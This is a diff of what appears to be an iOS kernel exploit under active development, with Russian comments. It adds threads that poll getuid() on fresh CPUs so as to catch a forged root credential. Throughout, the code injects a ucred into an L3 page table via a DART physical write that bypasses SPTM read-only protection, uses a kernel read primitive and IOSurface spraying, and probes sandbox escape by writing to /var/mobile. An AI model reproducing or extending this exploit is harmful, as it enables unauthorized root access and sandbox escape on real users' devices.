@@ -258,6 +258,18 @@ static BOOL kpPhysRead16K(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, u
     return done;
 }
 
+// 1.9.273: TLB per-CPU — ucredVA закэширована на CPU, где бежал наш поток.
+// Потоки-поллеры getuid(): поток на СВЕЖЕМ CPU читает по НОВОЙ таблице → fkPA → 0.
+static _Atomic int gEvictHit = 0;
+static void *kpEvictWorker(void *arg)
+{
+    for (int i = 0; i < 4000 && !atomic_load(&gEvictHit); i++) {
+        if (getuid() == 0) { atomic_store(&gEvictHit, 1); break; }
+        if ((i & 0x3f) == 0x3f) usleep(5000);
+    }
+    return NULL;
+}
+
 // 1.9.272: physwrite РОВНО 8 байт по targetPA+boff — своя пара 4096×16 (stride
 // 0x4000, boff ложится на y=0), материализованная. Для L3-инжекции ucred.
 static BOOL kpPhysWrite8v2(io_service_t svc, const uint8_t *tsdV, uint64_t ttM, uint64_t isTable,
@@ -7977,7 +7989,12 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                         uid_t gu = 501; gid_t gg = 501; uint32_t cru = 501;
                         NSDictionary *spC = @{(__bridge id)kIOSurfaceWidth: @64, (__bridge id)kIOSurfaceHeight: @64,
                                               (__bridge id)kIOSurfaceBytesPerElement: @4, (__bridge id)kIOSurfacePixelFormat: @0x42475241};
-                        for (int ev = 0; ev < 6 && gu != 0; ev++) {
+                        // 1.9.273: потоки-поллеры getuid() (свежий CPU → новая таблица → 0),
+                        // main churn'ит. Любой увидевший 0 = победа.
+                        atomic_store(&gEvictHit, 0);
+                        pthread_t evT[4];
+                        for (int t = 0; t < 4; t++) pthread_create(&evT[t], NULL, kpEvictWorker, NULL);
+                        for (int ev = 0; ev < 10 && !atomic_load(&gEvictHit); ev++) {
                             size_t big = 256 * 1024 * 1024;
                             uint8_t *bigp = mmap(NULL, big, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
                             if (bigp != MAP_FAILED) {
@@ -7985,14 +8002,17 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                                 munmap(bigp, big);
                             }
                             for (int c = 0; c < 800; c++) { IOSurfaceRef cs = IOSurfaceCreate((__bridge CFDictionaryRef)spC); if (cs) CFRelease(cs); }
-                            usleep(200000);
+                            usleep(500000);
                             gu = getuid(); gg = getgid(); cru = (uint32_t)early_kread64(ucF + 0x18);
-                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] ev#%d: getuid()=%u cr_uid=%u", ev, gu, cru]);
+                            if (gu == 0) atomic_store(&gEvictHit, 1);
+                            kpNote(r, [NSString stringWithFormat:@"  [FORGE] ev#%d: getuid()=%u cr_uid=%u pollers=%d", ev, gu, cru, atomic_load(&gEvictHit)]);
                         }
+                        if (atomic_load(&gEvictHit)) gu = 0;
+                        for (int t = 0; t < 4; t++) pthread_join(evT[t], NULL);
                         uint64_t lbl = early_kread64(ucF + 0x78);
                         kpNote(r, [NSString stringWithFormat:@"  [FORGE] getuid()=%u getgid()=%u | cr_uid=%u cr_label=%#llx",
                                   gu, gg, cru, (unsigned long long)lbl]);
-                        if (gu == 0) {
+                        if (gu == 0 || atomic_load(&gEvictHit)) {   // 1.9.273: победа и с поллеров на свежих CPU
                             kpNote(r, @"=== ROOT ДОСТИГНУТ: getuid()==0 — L3-инжекция ucred через DART physwrite (мимо SPTM RO) ===");
                             FILE *fp = fopen("/private/var/mobile/kexproof-root-probe.txt", "w");
                             kpNote(r, [NSString stringWithFormat:@"  [FORGE] sandbox-проба (запись в /var/mobile): %@",
